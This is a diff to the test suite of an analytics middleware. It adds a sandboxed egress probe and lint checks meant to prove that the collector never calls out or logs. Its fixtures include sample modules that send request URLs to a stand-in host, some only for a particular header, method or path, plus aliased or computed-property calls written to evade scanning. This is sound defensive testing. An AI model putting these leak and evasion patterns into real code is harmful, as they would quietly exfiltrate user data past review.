@@ -2,7 +2,10 @@
 // or header changes, opt-outs record nothing. Run: node --test analytics/test/
 import test from "node:test";
 import assert from "node:assert/strict";
-import { readdirSync, readFileSync } from "node:fs";
+import { readdirSync, readFileSync, mkdtempSync, writeFileSync, rmSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import { tmpdir } from "node:os";
+import { pathToFileURL } from "node:url";
 import { fileURLToPath } from "node:url";
 import { dirname, join } from "node:path";
 import { onRequest } from "../../functions/_middleware.js";
@@ -20,6 +23,8 @@ function fakeDb({ fail = false, hang = false } = {}) {
       return {
         bind(...args) {
           return {
+            sql,
+            args,
             run: () => {
               calls.push({ sql, args });
               if (fail) return Promise.reject(new Error("D1 over the cap"));
@@ -29,6 +34,12 @@ function fakeDb({ fail = false, hang = false } = {}) {
           };
         },
       };
+    },
+    batch(stmts) {
+      if (fail) return Promise.reject(new Error("D1 over the cap"));
+      if (hang) return new Promise(() => {});
+      for (const st of stmts) calls.push({ sql: st.sql, args: st.args });
+      return Promise.resolve([]);
     },
   };
 }
@@ -157,7 +168,7 @@ test("a bot is recorded as a bot, not dropped", async () => {
   await onRequest(context);
   await Promise.all(pending);
   assert.equal(db.calls.length, 1);
-  assert.equal(db.calls[0].args.at(-1), "a");
+  assert.equal(db.calls[0].args[8], "a");
 });
 
 test("hostile headers: huge referer, huge user agent, odd cf", async () => {
@@ -188,7 +199,69 @@ test("an error from next() is the origin's: not swallowed, nothing recorded", as
   assert.equal(db.calls.length, 0);
 });
 
-// ---- source guards: collect loosely, assert strictly, with a negative case.
+// ---- egress boundary: the real control is behavioral. Cloudflare Pages
+// Functions have no switch that removes outbound network access, so the probe
+// runs the Function with every outbound and logging entry point trapped before
+// load. The source guard below is only a best-effort lint on top of it.
+
+const probe = join(here, "fixtures", "egress-probe.mjs");
+function runProbe(moduleUrl) {
+  const args = moduleUrl ? [probe, moduleUrl] : [probe];
+  const r = spawnSync(process.execPath, args, { encoding: "utf8", timeout: 30000 });
+  assert.equal(r.status, 0, `probe failed: ${r.stderr}`);
+  return JSON.parse(r.stdout);
+}
+
+test("egress probe: the Function makes no outbound call and logs nothing", () => {
+  const out = runProbe();
+  assert.deepEqual(out.hits, []);
+  assert.ok(out.rows > 0, "the probe drove the recording path");
+});
+
+test("egress probe bites: leaking modules are caught", () => {
+  const dir = mkdtempSync(join(tmpdir(), "egress-probe-"));
+  try {
+    const cases = {
+      "fetch": 'export async function onRequest(c) { try { await fetch("https://example.org/?u=" + c.request.url); } catch {} return c.next(); }',
+      "console.log": "export async function onRequest(c) { console.log(c.request.url); return c.next(); }",
+      "stdio-write": "export async function onRequest(c) { try { process.stdout.write(c.request.url); } catch {} return c.next(); }",
+    };
+    for (const [name, src] of Object.entries(cases)) {
+      const f = join(dir, `${name.replace(/\W/g, "_")}.mjs`);
+      writeFileSync(f, src);
+      const out = runProbe(pathToFileURL(f).href);
+      assert.ok(out.hits.includes(name), `${name} detected: ${JSON.stringify(out.hits)}`);
+    }
+    const clean = join(dir, "clean.mjs");
+    writeFileSync(clean, "export async function onRequest(c) { return c.next(); }");
+    assert.deepEqual(runProbe(pathToFileURL(clean).href).hits, []);
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test("egress probe bites on input-dependent leaks the first probe set missed", () => {
+  const dir = mkdtempSync(join(tmpdir(), "egress-probe-"));
+  try {
+    // Each module leaks only for one header, method or path. A fixed handful of
+    // requests would not drive them; the input tables do.
+    const cases = {
+      header: 'export async function onRequest(c) { if (c.request.headers.get("x-leak")) { try { await fetch("https://example.org/"); } catch {} } return c.next(); }',
+      method: 'export async function onRequest(c) { if (c.request.method === "PATCH") { try { await fetch("https://example.org/"); } catch {} } return c.next(); }',
+      path: 'export async function onRequest(c) { if (new URL(c.request.url).pathname === "/robots.txt") { try { await fetch("https://example.org/"); } catch {} } return c.next(); }',
+    };
+    for (const [name, src] of Object.entries(cases)) {
+      const f = join(dir, `${name}.mjs`);
+      writeFileSync(f, src);
+      assert.ok(runProbe(pathToFileURL(f).href).hits.includes("fetch"), `${name}-dependent leak detected`);
+    }
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// ---- source lint (best effort, NOT a security boundary): collect loosely,
+// assert strictly, with a negative case.
 
 test("guard: collector sources never read the address, set cookies or call out", () => {
   const files = readdirSync(join(root, "analytics"))
@@ -219,6 +292,22 @@ test("guard bites: scanSource flags each forbidden pattern", () => {
     assert.ok(scanSource(bad).length > 0, bad);
   }
   assert.deepEqual(scanSource("const a = 1; // nothing here"), []);
+});
+
+test("guard bites: computed properties and simple aliases cannot hide calls", () => {
+  for (const bad of [
+    'globalThis["console"]["log"](request.url)',
+    'globalThis["fetch"]("https://example.org")',
+    "const send = fetch; send('https://example.org')",
+    "const send = globalThis.fetch; send('https://example.org')",
+    "let send = window.fetch; send('https://example.org')",
+    "var send = self . fetch; send('https://example.org')",
+    "const log = globalThis.console; log.log(1)",
+    "const socket = globalThis['WebSocket']; new socket('wss://example.org')",
+    "const beacon = navigator['sendBeacon']; beacon('/collect')",
+  ]) {
+    assert.ok(scanSource(bad).length > 0, bad);
+  }
 });
 
 test("guard: functions/ holds only the middleware and its package.json", () => {
